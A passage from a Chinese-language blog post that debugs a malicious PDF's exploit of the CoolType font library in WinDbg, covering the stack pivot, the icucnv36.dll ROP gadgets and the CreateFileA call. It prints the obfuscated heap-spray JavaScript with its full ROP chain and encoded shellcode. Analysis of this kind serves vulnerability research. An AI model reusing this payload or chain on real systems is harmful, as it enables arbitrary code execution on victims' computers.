class="line"><span class="number">0801b</span>b24 ff7520          push    dword ptr [ebp+<span class="number">20</span>h]  ss:<span class="number">0023</span>:<span class="number">0012</span>dd88=<span class="number">00000001</span></span><br><span class="line"><span class="number">0801b</span>b27 <span class="number">8b</span>4d08          mov     ecx,dword ptr [ebp+<span class="number">8</span>] ss:<span class="number">0023</span>:<span class="number">0012</span>dd70=<span class="number">01</span>efc87c</span><br><span class="line"><span class="number">0801b</span>b2a ff751c          push    dword ptr [ebp+<span class="number">1</span>Ch]  ss:<span class="number">0023</span>:<span class="number">0012</span>dd84=<span class="number">00000000</span></span><br><span class="line"><span class="number">0801b</span>b2d <span class="number">8b</span>01            mov     eax,dword ptr [ecx]  ds:<span class="number">0023</span>:<span class="number">01</span>efc87c=<span class="number">081</span>a601c</span><br><span class="line"><span class="number">0801b</span>b2f ff7518          push    dword ptr [ebp+<span class="number">18</span>h]  ss:<span class="number">0023</span>:<span class="number">0012</span>dd80=<span class="number">00000000</span></span><br><span class="line"><span class="number">0801b</span>b32 ff05a0a62308    inc     dword ptr [CoolType!CTCleanup+<span class="number">0xebdd6</span> (<span class="number">0823</span>a6a0)] ds:<span class="number">0023</span>:<span class="number">0823</span>a6a0=<span class="number">00000000</span></span><br><span class="line"><span class="number">0801b</span>b38 ff7514          push    dword ptr [ebp+<span class="number">14</span>h]  ss:<span class="number">0023</span>:<span class="number">0012</span>dd7c=<span class="number">0012</span>dde4</span><br><span class="line"><span class="number">0801b</span>b3b ff7510          push    dword ptr [ebp+<span class="number">10</span>h]  ss:<span class="number">0023</span>:<span class="number">0012</span>dd78=<span class="number">0012</span>ddc8</span><br><span class="line"><span class="number">0801b</span>b3e ff750c          push    dword ptr [ebp+<span class="number">0</span>Ch]  ss:<span class="number">0023</span>:<span class="number">0012</span>dd74=<span class="number">0012e718</span></span><br><span class="line"><span class="number">0801b</span>b41 ff10            call    dword ptr [eax]      ds:<span class="number">0023</span>:<span class="number">081</span>a601c=<span class="number">0808b</span>116</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="number">0808b</span>116 <span class="number">55</span>              push    ebp</span><br><span class="line"><span class="number">0808b</span>117 <span class="number">8b</span>ec            mov     ebp,esp</span><br><span class="line"><span class="number">0808b</span>119 <span class="number">51</span>              push    ecx</span><br><span class="line"><span class="number">0808b</span>11a <span class="number">53</span>              push    ebx</span><br><span class="line"><span class="number">0808b</span>11b <span class="number">56</span>              push    esi</span><br><span class="line"><span class="number">0808b</span>11c <span class="number">57</span>              push    edi</span><br><span class="line"><span class="number">0808b</span>11d <span class="number">8b</span>7d08          mov     edi,dword ptr [ebp+<span class="number">8</span>] ss:<span class="number">0023</span>:<span class="number">0012</span>dd50=<span class="number">0012e718</span></span><br><span class="line"><span class="number">0808b</span>120 <span class="number">57</span>              push    edi</span><br><span class="line"><span class="number">0808b</span>121 <span class="number">8b</span>f1            mov     esi,ecx</span><br><span class="line"><span class="number">0808b</span>123 e802ffffff      call    CoolType!CTInit+<span class="number">0x44987</span> (<span class="number">0808b</span>02a)</span><br><span class="line"><span class="number">0808b</span>128 <span class="number">33</span>db            xor     ebx,ebx</span><br><span class="line"><span class="number">0808b</span>12a <span class="number">84</span>c0            test    al,al</span><br><span class="line"><span class="number">0808b</span>12c <span class="number">0f</span>8499010000    je      CoolType!CTInit+<span class="number">0x44c28</span> (<span class="number">0808b</span>2cb)      [br=<span class="number">0</span>]</span><br><span class="line"><span class="number">0808b</span>132 <span class="number">385</span>d1c          cmp     byte ptr [ebp+<span class="number">1</span>Ch],bl      ss:<span class="number">0023</span>:<span class="number">0012</span>dd64=<span class="number">01</span></span><br><span class="line"><span class="number">0808b</span>135 <span class="number">0f</span>8590010000    jne     CoolType!CTInit+<span class="number">0x44c28</span> (<span class="number">0808b</span>2cb)      [br=<span class="number">1</span>]</span><br><span class="line"><span class="number">0808b</span>2cb <span class="number">8b</span>06            mov     eax,dword ptr [esi]  ds:<span class="number">0023</span>:<span class="number">01</span>efc87c=<span class="number">081</span>a601c</span><br><span class="line"><span class="number">0808b</span>2cd <span class="number">885</span>d1f          mov     byte ptr [ebp+<span class="number">1F</span>h],bl      ss:<span class="number">0023</span>:<span class="number">0012</span>dd67=<span class="number">00</span></span><br><span class="line"><span class="number">0808b</span>2d0 ff5070          call    dword ptr [eax+<span class="number">70</span>h]  ds:<span class="number">0023</span>:<span class="number">081</span>a608c=<span class="number">08089937</span></span><br><span class="line"><span class="number">0808b</span>2d3 <span class="number">57</span>              push    edi</span><br><span class="line"><span class="number">0808b</span>2d4 <span class="number">8</span>d4e14          lea     ecx,[esi+<span class="number">14</span>h]</span><br><span class="line"><span class="number">0808b</span>2d7 e86432f9ff      call    CoolType+<span class="number">0x1e540</span> (<span class="number">0801e540</span>)</span><br><span class="line"><span class="number">0808b</span>2dc c686e000000001  mov     byte ptr [esi+<span class="number">0E0</span>h],<span class="number">1</span>      ds:<span class="number">0023</span>:<span class="number">01</span>efc95c=<span class="number">00</span></span><br><span class="line"><span class="number">0808b</span>2e3 <span class="number">8b</span>473c          mov     eax,dword ptr [edi+<span class="number">3</span>Ch] ds:<span class="number">0023</span>:<span class="number">0012e754</span>=<span class="number">0012e6</span>d0</span><br><span class="line"><span class="number">0808b</span>2e6 <span class="number">3b</span>c3            cmp     eax,ebx</span><br><span class="line"><span class="number">0808b</span>2e8 <span class="number">8986f</span>4020000    mov     dword ptr [esi+<span class="number">2F</span>4h],eax ds:<span class="number">0023</span>:<span class="number">01</span>efcb70=<span class="number">0012e6</span>d0</span><br><span class="line"><span class="number">0808b</span>2ee <span class="number">899</span>ef8020000    mov     dword ptr [esi+<span class="number">2F</span>8h],ebx ds:<span class="number">0023</span>:<span class="number">01</span>efcb74=<span class="number">00000000</span></span><br><span class="line"><span class="number">0808b</span>2f4 <span class="number">895</span>dfc          mov     dword ptr [ebp<span class="number">-4</span>],ebx ss:<span class="number">0023</span>:<span class="number">0012</span>dd44=<span class="number">01</span>efc87c</span><br><span class="line"><span class="number">0808b</span>2f7 <span class="number">7507</span>            jne     CoolType!CTInit+<span class="number">0x44c5d</span> (<span class="number">0808b</span>300)      [br=<span class="number">1</span>]</span><br><span class="line"><span class="number">0808b</span>300 <span class="number">8</span>d4dfc          lea     ecx,[ebp<span class="number">-4</span>]</span><br><span class="line"><span class="number">0808b</span>303 <span class="number">51</span>              push    ecx</span><br><span class="line"><span class="number">0808b</span>304 <span class="number">53</span>              push    ebx</span><br><span class="line"><span class="number">0808b</span>305 <span class="number">6</span>a03            push    <span class="number">3</span></span><br><span class="line"><span class="number">0808b</span>307 <span class="number">50</span>              push    eax</span><br><span class="line"><span class="number">0808b</span>308 ff10            call    dword ptr [eax]      ds:<span class="number">0023</span>:<span class="number">0012e6</span>d0=<span class="number">4</span>a80cb38</span><br></pre></td></tr></table></figure></p>
<p>下面来看下 <code>call    dword ptr [eax]</code> 会执行什么指令。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; r eax </span><br><span class="line">eax=0012e6d0</span><br><span class="line">0:000&gt; dd 0012e6d0 L1</span><br><span class="line">0012e6d0  4a80cb38</span><br><span class="line">0:000&gt; !address 4a80cb38</span><br><span class="line">*************************************************************************</span><br><span class="line">Usage:                  Image</span><br><span class="line">Allocation Base:        4a800000</span><br><span class="line">Base Address:           4a801000</span><br><span class="line">End Address:            4a849000</span><br><span class="line">Region Size:            00048000</span><br><span class="line">Type:                   01000000	MEM_IMAGE</span><br><span class="line">State:                  00001000	MEM_COMMIT</span><br><span class="line">Protect:                00000020	PAGE_EXECUTE_READ</span><br><span class="line">More info:              lmv m icucnv36</span><br><span class="line">More info:              !lmi icucnv36</span><br><span class="line">More info:              ln 0x4a80cb38</span><br><span class="line">0:000&gt; u 4a80cb38</span><br><span class="line">icucnv36!ucnv_toUChars_3_6+0x162:</span><br><span class="line">4a80cb38 81c594070000    add     ebp,794h</span><br><span class="line">4a80cb3e c9              leave</span><br><span class="line">4a80cb3f c3              ret</span><br></pre></td></tr></table></figure></p>
<p>所以 <code>icucnv36!ucnv_toUChars_3_6+0x162</code> 处的 <code>gadget</code> 的作用就很明显了， <code>stack pivot</code>。单步执行看下下一个 <code>gadget</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; r ebp</span><br><span class="line">ebp=0012dd48</span><br><span class="line">0:000&gt; dd ebp</span><br><span class="line">0012dd48  0012dd68 0801bb43 0012e718 0012ddc8</span><br><span class="line">0012dd58  0012dde4 00000000 00000000 00000001</span><br><span class="line">0012dd68  0012ddf8 08016c5b 01efc87c 0012e718</span><br><span class="line">0012dd78  0012ddc8 0012dde4 00000000 00000000</span><br><span class="line">0012dd88  00000001 67e934c2 0012e718 00000000</span><br><span class="line">0012dd98  0012e608 0823a650 0012e4bc ff270000</span><br><span class="line">0012dda8  00000003 1200ccdd 81234378 1200b8e7</span><br><span class="line">0012ddb8  120058e8 1200b8e7 8d235d88 120034de</span><br><span class="line">0:000&gt; p</span><br><span class="line">eax=0012e6d0 ebx=00000000 ecx=0012dd44 edx=00000000 esi=01efc87c edi=0012e718</span><br><span class="line">eip=4a80cb3e esp=0012dd24 ebp=0012e4dc iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200202</span><br><span class="line">icucnv36!ucnv_toUChars_3_6+0x168:</span><br><span class="line">4a80cb3e c9              leave</span><br><span class="line">0:000&gt; dd ebp</span><br><span class="line">0012e4dc  f012512c 4a82a714 0c0c0c0c 47dabcf2</span><br><span class="line">0012e4ec  5c064f94 5c53850a 57ef3bba e910375e</span><br><span class="line">0012e4fc  ef4039c2 f0e3b6aa 61a8c5b4 c2474a7a</span><br><span class="line">0012e50c  15da11a6 436a7060 1d9d4505 1c1f88da</span><br><span class="line">0012e51c  249ca0df e4d40d46 269a3dfc daed6b97</span><br><span class="line">0012e52c  c920c5fc 2d4265c3 cb1f5a53 5a0c27e0</span><br><span class="line">0012e53c  69fd2e39 6d70eb0d b877a4e9 db9a8a4d</span><br><span class="line">0012e54c  883c0409 f6fa0ea5 6634d433 e7f0ef0d</span><br><span class="line">0:000&gt; p</span><br><span class="line">eax=0012e6d0 ebx=00000000 ecx=0012dd44 edx=00000000 esi=01efc87c edi=0012e718</span><br><span class="line">eip=4a80cb3f esp=0012e4e0 ebp=f012512c iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200202</span><br><span class="line">icucnv36!ucnv_toUChars_3_6+0x169:</span><br><span class="line">4a80cb3f c3              ret</span><br><span class="line">0:000&gt; p</span><br><span class="line">eax=0012e6d0 ebx=00000000 ecx=0012dd44 edx=00000000 esi=01efc87c edi=0012e718</span><br><span class="line">eip=4a82a714 esp=0012e4e4 ebp=f012512c iopl=0         nv up ei pl nz na po nc</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200202</span><br><span class="line">icucnv36!icu_3_6::CharacterIterator::setToStart+0x8:</span><br><span class="line">4a82a714 5c              pop     esp</span><br><span class="line">0:000&gt; dd esp L1</span><br><span class="line">0012e4e4  0c0c0c0c</span><br><span class="line">0:000&gt; u 4a82a714 </span><br><span class="line">icucnv36!icu_3_6::CharacterIterator::setToStart+0x8:</span><br><span class="line">4a82a714 5c              pop     esp</span><br><span class="line">4a82a715 c3              ret</span><br></pre></td></tr></table></figure></p>
<p>通过两个 <code>gadget</code> 控制 <code>eip</code> 到了 <code>[0x0c0c0c0c]</code>,剩下就是堆喷射啦。<br>如果用图来表示这个过程的话，大概是下面这样吧。<br><img src="http://static.zybuluo.com/dane909/39u8io5zaa7z37msn91zijiz/ffss.png" alt="ffss.png-27.1kB"><br><code>emmmmmm</code> 现在已经控制 <code>eip = [0x0c0c0c0c]</code> 啦，剩下的就好多了， 堆喷射完成 <code>shellcode</code> 的布局，然后就是使 <code>eip</code> 滑入放置好的 <code>shllcode</code> 啦，堆喷射的代码可以通过 <code>PdfStreamDumper</code> 得到。<br><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="keyword">var</span> mqraPQZSAwAwCczJcaACUcIIwCnLbss = <span class="built_in">unescape</span>;</span><br><span class="line"><span class="keyword">var</span> twSOePGGglyJWdlzCpRIHpSsaEoDFZmatVqAcDoCSkrLKdpcOIBqGOVtWQMSEAGMpVRA = mqraPQZSAwAwCczJcaACUcIIwCnLbss( <span class="string">'%u4141%u4141%u63a5%u4a80%u0000%u4a8a%u2196%u4a80%u1f90%u4a80%u903c%u4a84%ub692%u4a80%u1064%u4a80%u22c8%u4a85%u0000%u1000%u0000%u0000%u0000%u0000%u0002%u0000%u0102%u0000%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9038%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0000%u0000%u0040%u0000%u0000%u0000%u0000%u0001%u0000%u0000%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0008%u0000%ua8a6%u4a80%u1f90%u4a80%u9030%u4a84%ub692%u4a80%u1064%u4a80%uffff%uffff%u0022%u0000%u0000%u0000%u0000%u0000%u0000%u0001%u63a5%u4a80%u0004%u4a8a%u2196%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0030%u0000%ua8a6%u4a80%u1f90%u4a80%u0004%u4a8a%ua7d8%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u0020%u0000%ua8a6%u4a80%u63a5%u4a80%u1064%u4a80%uaedc%u4a80%u1f90%u4a80%u0034%u0000%ud585%u4a80%u63a5%u4a80%u1064%u4a80%u2db2%u4a84%u2ab1%u4a80%u000a%u0000%ua8a6%u4a80%u1f90%u4a80%u9170%u4a84%ub692%u4a80%uffff%uffff%uffff%uffff%uffff%uffff%u1000%u0000%u64b8%u9c0f%uda97%ud9cc%u2474%u5ef4%uc929%u31b1%uc683%u3104%u0f46%u4603%ued6b%u6b69%u739b%u9491%u145b%u711b%u146a%uf17f%ua4dc%u570b%u4fd0%u4c59%u3d63%u6376%u88c4%u4aa0%ua1d5%ucd91%ub855%u2dc5%u7364%u2f18%u6ea1%u7dd1%ue47a%u9244%ub00f%u1954%u5443%ufedd%u5713%u50cc%u0e28%u53ce%u3afd%u4c47%u07e2%ue711%ufcd0%u21a0%ufc29%u0c0f%u0f86%u4851%uf020%ua024%u8d53%u773e%u492e%u6cca%u1a88%u496c%uce29%u1aeb%ubb25%u4478%u3a29%ufeac%ub755%ud153%u83dc%uf577%u5085%uac19%u3663%uae26%ue7cc%ua482%ufce0%ue6be%u026e%u9d4c%u04dc%u9e4e%u6d70%u157f%uea1f%ufc80%u0464%u5dcb%u8dcc%u3792%ud04d%ue224%ued91%u07a6%u0a69%u6db6%u566c%u9d70%uc71c%ua115%ue8b3%uc23f%u7b52%u2ba3%ufbf1%u3446'</span> );</span><br><span class="line"><span class="keyword">var</span> NrWJJGMFyDgCbq = mqraPQZSAwAwCczJcaACUcIIwCnLbss( <span class="string">"%"</span> + <span class="string">"u"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"%u"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> + <span class="string">"0"</span> + <span class="string">"c"</span> );</span><br><span class="line"><span class="keyword">while</span> (NrWJJGMFyDgCbq.length + <span class="number">20</span> + <span class="number">8</span> &lt; <span class="number">65536</span>) NrWJJGMFyDgCbq+=NrWJJGMFyDgCbq;</span><br><span class="line">BuWToJIZTn = NrWJJGMFyDgCbq.substring(<span class="number">0</span>, (<span class="number">0x0c0c</span><span class="number">-0x24</span>)/<span class="number">2</span>);</span><br><span class="line">BuWToJIZTn += twSOePGGglyJWdlzCpRIHpSsaEoDFZmatVqAcDoCSkrLKdpcOIBqGOVtWQMSEAGMpVRA;</span><br><span class="line">BuWToJIZTn += NrWJJGMFyDgCbq;</span><br><span class="line">wrIFk = BuWToJIZTn.substring(<span class="number">0</span>, <span class="number">65536</span>/<span class="number">2</span>);</span><br><span class="line"><span class="keyword">while</span>(wrIFk.length &lt; <span class="number">0x80000</span>) wrIFk += wrIFk;</span><br><span class="line">TjCv = wrIFk.substring(<span class="number">0</span>, <span class="number">0x80000</span> - (<span class="number">0x1020</span><span class="number">-0x08</span>) / <span class="number">2</span>);</span><br><span class="line"><span class="keyword">var</span> erZHzdqUNRLxpgKzIZXauOqtrPeTBcQpgRKVLwLA = <span class="keyword">new</span> <span class="built_in">Array</span>();</span><br><span class="line"><span class="keyword">for</span> (wABhQLfeICwQWoJJAlzOKIJXBheCXUwFoFqgj=<span class="number">0</span>;wABhQLfeICwQWoJJAlzOKIJXBheCXUwFoFqgj&lt;<span class="number">0x1f0</span>;wABhQLfeICwQWoJJAlzOKIJXBheCXUwFoFqgj++) erZHzdqUNRLxpgKzIZXauOqtrPeTBcQpgRKVLwLA[wABhQLfeICwQWoJJAlzOKIJXBheCXUwFoFqgj]=TjCv+<span class="string">"s"</span>;</span><br></pre></td></tr></table></figure></p>
<p>上面的 <code>shellcode</code> 是能还原出来的，不过为了熟悉下调试还是用 <code>windbg</code>吧。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dd 0c0c0c0c L20</span><br><span class="line">0c0c0c0c  4a8063a5 4a8a0000 4a802196 4a801f90</span><br><span class="line">0c0c0c1c  4a84903c 4a80b692 4a801064 4a8522c8</span><br><span class="line">0c0c0c2c  10000000 00000000 00000000 00000002</span><br><span class="line">0c0c0c3c  00000102 00000000 4a8063a5 4a801064</span><br><span class="line">0c0c0c4c  4a842db2 4a802ab1 00000008 4a80a8a6</span><br><span class="line">0c0c0c5c  4a801f90 4a849038 4a80b692 4a801064</span><br><span class="line">0c0c0c6c  ffffffff 00000000 00000040 00000000</span><br><span class="line">0c0c0c7c  00010000 00000000 4a8063a5 4a801064</span><br></pre></td></tr></table></figure></p>
<p>我们先来看下堆中这些数据的内容<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; u 4a8063a5 </span><br><span class="line">icucnv36!uenum_count_3_6+0x1d:</span><br><span class="line">4a8063a5 59              pop     ecx</span><br><span class="line">4a8063a6 c3              ret</span><br></pre></td></tr></table></figure></p>
<p>执行完成后 <code>ecx = 0x4a8a0000</code>,再来看下 <code>0x4a802196</code> 处<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; u 4a802196</span><br><span class="line">icucnv36!ubidi_getClassCallback_3_6+0x22:</span><br><span class="line">4a802196 8901            mov     dword ptr [ecx],eax</span><br><span class="line">4a802198 c3              ret</span><br></pre></td></tr></table></figure></p>
<p>执行完后 <code>[0x4a8a0000] = 0x0012e6d0</code>,之后跳到了 <code>0x4a801f90</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; u 4a801f90</span><br><span class="line">icucnv36!ubidi_getDirection_3_6+0x18:</span><br><span class="line">4a801f90 58              pop     eax</span><br><span class="line">4a801f91 c3              ret</span><br></pre></td></tr></table></figure></p>
<p>最后 <code>eax =4a84903c</code>,跳到了 <code>0x4a80b692</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; u 4a80b692</span><br><span class="line">icucnv36!u_errorName_3_6+0xdf:</span><br><span class="line">4a80b692 ff20            jmp     dword ptr [eax]</span><br></pre></td></tr></table></figure></p>
<p><code>0x4a84903c</code> 实际上是 <code>icucnv36.dll</code> 里函数<code>CreateFileA</code> 在导入表中的地址，所以这样就完成了对<code>CreateFileA</code>函数的调用。<br>函数参数如下<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; dd 0c0c0c28 L7</span><br><span class="line">0c0c0c28  4a8522c8 10000000 00000000 00000000</span><br><span class="line">0c0c0c38  00000002 00000102 00000000</span><br><span class="line">0:000&gt; da 4a8522c8</span><br><span class="line">4a8522c8  &quot;iso88591&quot;</span><br></pre></td></tr></table></figure></p>
<p>即<code>CreateFileA(0x4a8522c8,GENERIC_ALL,0,NULL,CREATE_ALWAYS,HIDDEN|TEMPORARY,NULL)</code>。<br>之后通过 <code>0x4a801064</code> 处的 <code>ret</code> 指令重新反回到了<code>icucnv36.dll</code>。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">eax=00000328 ebx=00000000 ecx=7c93003d edx=04c30002 esi=01efc87c edi=0012e718</span><br><span class="line">eip=4a801064 esp=0c0c0c44 ebp=f012512c iopl=0         nv up ei ng nz ac po cy</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200293</span><br><span class="line">icucnv36+0x1064:</span><br><span class="line">4a801064 c3              ret</span><br></pre></td></tr></table></figure></p>
<p>然后看下如何再一次控制 <code>eip</code> 去完成我们想做的事情。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">0:000&gt; </span><br><span class="line">eax=00000328 ebx=00000000 ecx=7c93003d edx=04c30002 esi=01efc87c edi=0012e718</span><br><span class="line">eip=4a8063a5 esp=0c0c0c48 ebp=f012512c iopl=0         nv up ei ng nz ac po cy</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200293</span><br><span class="line">icucnv36!uenum_count_3_6+0x1d:</span><br><span class="line">4a8063a5 59              pop     ecx</span><br><span class="line">0:000&gt; p</span><br><span class="line">eax=00000328 ebx=00000000 ecx=4a801064 edx=04c30002 esi=01efc87c edi=0012e718</span><br><span class="line">eip=4a8063a6 esp=0c0c0c4c ebp=f012512c iopl=0         nv up ei ng nz ac po cy</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200293</span><br><span class="line">icucnv36!uenum_count_3_6+0x1e:</span><br><span class="line">4a8063a6 c3              ret</span><br><span class="line">0:000&gt; </span><br><span class="line">eax=00000328 ebx=00000000 ecx=4a801064 edx=04c30002 esi=01efc87c edi=0012e718</span><br><span class="line">eip=4a842db2 esp=0c0c0c50 ebp=f012512c iopl=0         nv up ei ng nz ac po cy</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200293</span><br><span class="line">icucnv36!u_strFromUTF32_3_6+0x142:</span><br><span class="line">4a842db2 97              xchg    eax,edi</span><br><span class="line">0:000&gt; p</span><br><span class="line">eax=0012e718 ebx=00000000 ecx=4a801064 edx=04c30002 esi=01efc87c edi=00000328</span><br><span class="line">eip=4a842db3 esp=0c0c0c50 ebp=f012512c iopl=0         nv up ei ng nz ac po cy</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200293</span><br><span class="line">icucnv36!u_strFromUTF32_3_6+0x143:</span><br><span class="line">4a842db3 c3              ret</span><br><span class="line">0:000&gt; p</span><br><span class="line">eax=0012e718 ebx=00000000 ecx=4a801064 edx=04c30002 esi=01efc87c edi=00000328</span><br><span class="line">eip=4a802ab1 esp=0c0c0c54 ebp=f012512c iopl=0         nv up ei ng nz ac po cy</span><br><span class="line">cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00200293</span><br><span class="line">icucnv36!ubidi_getDummy_3_6+0xc7:</span><br><span class="line">4a802ab1 5b              pop     ebx</span><br></pre></td></tr></table></figure></p>
<p>实际上下面要执行的 <code>gadget</code> 的作用是重新控制 <code>eip</code> ，和之前的<code>call    dword ptr [eax]</code> 是类似的，使用的 <code>gadget</code> 如下:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">icucnv36!ubidi_getDummy_3_6+0xc7:</span><br><span class="line">4a802ab1 5b              pop     ebx</span><br><span class="line">4a802ab2 c3              ret</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">icucnv36!uprv_pathIsAbsolute_3_6+0xd:</span><br><span class="line">4a80a8a6 213c5c          and     dword ptr [esp+ebx*2],edi ss:0023:0c0c0c6c=ffffffff</span><br><span class="line">4a80a8a9 7503            jne     icucnv36!uprv_pathIsAbsolute_3_6+0x15 (4a80a8ae) [br=1]</span><br><span class="line">4a80a8ae 3c2f            cmp     al,2Fh</span><br><span class="line">4a80a8b0 74f9            je      icucnv36!uprv_pathIsAbsolute_3_6+0x12 (4a80a8ab) [br=0]</span><br><span class="line">4a80a8b2 3c41            cmp     al,41h</span><br><span class="line">4a80a8b4 7c04            jl      icucnv36!uprv_pathIsAbsolute_3_6+0x21 (4a80a8ba) [br=1]</span><br><span class="line">4a80a8ba 3c61            cmp     al,61h</span><br><span class="line">4a80a8bc 7c0a            jl      icucnv36!uprv_pathIsAbsolute_3_6+0x2f (4a80a8c8) [br=1]</span><br><span class="line">4a80a8c8 32c0            xor     al,al</span><br><span class="line">4a80a8ca c3              ret</span><br><span class="line"></span><br><span class="line">icucnv36!ubidi_getDirection_3_6+0x18:</span><br><span class="line">4a801f90 58              pop     eax</span><br><span class="line">4a801f91 c3              ret</span><br><span class="line"></span><br><span class="line">icucnv36!u_errorName_3_6+0xdf:</span><br><span class="line">4a80b692 ff20            jmp     dword ptr [eax]      ds:0023:4a849038=&#123;kernel32!CreateFileMappingA (7c8094ee)&#125;</span><br></pre></td></tr></table></figure></p>
